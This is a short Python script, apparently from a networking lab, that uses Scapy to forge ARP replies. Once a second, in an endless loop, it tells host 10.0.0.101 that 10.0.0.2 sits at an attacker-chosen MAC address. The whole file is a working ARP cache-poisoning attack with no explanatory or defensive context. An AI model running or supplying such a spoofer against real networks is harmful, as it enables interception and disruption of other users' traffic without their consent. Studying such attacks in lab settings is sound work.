#! /usr/bin/env python

import sys
from scapy.all import *

ips="10.0.0.2"
ipd="10.0.0.101"
hs="00:00:00:00:00:FF"
hd="00:00:00:00:00:AA"

p=Ether(src=hs,dst=hd)/ARP(op=2,psrc=ips,pdst=ipd,hwdst=hd,hwsrc=hs)

if p:
    sendp(p,loop=1,inter=1)

